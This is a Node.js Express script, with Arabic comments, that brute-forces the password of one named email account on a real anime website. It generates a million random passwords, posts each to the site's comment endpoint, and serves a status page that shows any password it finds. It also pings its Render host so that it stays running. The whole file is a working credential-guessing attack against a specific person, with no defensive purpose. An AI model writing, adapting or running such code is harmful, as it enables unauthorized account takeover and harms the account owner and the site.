const express = require("express");
const app = express();
const axios = require("axios");

const targetEmail = "abrheem16@gmail.com";
const animeId = "532";
const commentText = "TEST";

let foundPassword = null;
let finished = false;
let currentTry = "";
let allPasswords = [];
let currentIndex = 0;
const retryLimit = 3;

function isRetryableError(error) {
  return (
    error.code === "ECONNABORTED" ||
    error.code === "ECONNRESET" ||
    error.response?.status === 502 ||
    error.response?.status === 503 ||
    error.response?.status === 504
  );
}

async function tryPassword(password, attempt = 1) {
  try {
    const response = await axios.post(
      "https://app.sanime.net/function/h10.php?page=addcmd",
      new URLSearchParams({
        email: targetEmail,
        password: password,
        item: JSON.stringify({ post: commentText, id: animeId, fire: false }),
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent":
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
          Connection: "keep-alive",
        },
        timeout: 8000,
      }
    );

    const body = response.data;
    console.log(`🧪 تجربة: ${password}`);
    console.log("📨 رد السيرفر:", body);

    if (body && typeof body === "object" && body.status === 1) {
      foundPassword = password;
      finished = true;
      console.log(`✅ كلمة المرور الصحيحة: ${password}`);
    } else {
      console.log(`❌ غير صحيحة: ${password}`);
    }
  } catch (error) {
    if (isRetryableError(error) && attempt < retryLimit && !foundPassword && !finished) {
      console.log(`⚠️ خطأ في الاتصال مع الباسورد ${password}... إعادة المحاولة (${attempt})`);
      await tryPassword(password, attempt + 1);
    } else {
      console.log(`❌ فشل التجربة: ${password}`);
      console.log("🛑 الخطأ:", error.message || error.code || error);
      if (error.response?.data) {
        console.log("📨 رد السيرفر (حتى مع الخطأ):", error.response.data);
      }
    }
  }
}

async function bruteForceStart() {
  const interval = setInterval(async () => {
    if (finished || currentIndex >= allPasswords.length) {
      clearInterval(interval);
      finished = true;
      return;
    }

    const password = allPasswords[currentIndex];
    currentTry = password;
    await tryPassword(password);
    currentIndex++;
  }, 1000);
}

app.get("/", (req, res) => {
  const html = `
    <html>
      <head><meta http-equiv="refresh" content="5"><title>Status</title></head>
      <body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px">
        <h1>🔐 كلمة المرور:</h1>
        ${
          foundPassword
            ? `<h2 style="color:#0f0">${foundPassword}</h2>`
            : finished
            ? `<h2 style="color:orange">❌ انتهى التجريب ولم يتم العثور على الباسورد</h2>`
            : `<h2>جاري التجريب... 🌀</h2><h3>🔍 الآن: ${currentTry}</h3>`
        }
        <p style="color:#888">📡 https://noon-9v11.onrender.com/</p>
      </body>
    </html>`;
  res.send(html);
});

function generatePasswords(count) {
  const charset = "abcdefghijklmnopqrstuvwxyz";
  const digits = "0123456789";
  const list = new Set();

  while (list.size < count) {
    let numDigits = Math.floor(Math.random() * 4); // 0-3 digits
    let numLetters = 8 - numDigits;
    let pass = "";

    for (let i = 0; i < numLetters; i++) {
      pass += charset[Math.floor(Math.random() * charset.length)];
    }

    for (let i = 0; i < numDigits; i++) {
      pass += digits[Math.floor(Math.random() * digits.length)];
    }

    pass = pass.split("").sort(() => Math.random() - 0.5).join("");
    list.add(pass);
  }

  return Array.from(list);
}

// توليد مليون كلمة مرور
allPasswords = generatePasswords(1000000);
bruteForceStart();

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});

// ping للرابط كل 5 دقائق حتى يبقى حي على Render
setInterval(() => {
  axios.get("https://noon-9v11.onrender.com/").catch(() => {});
}, 5 * 60 * 1000);
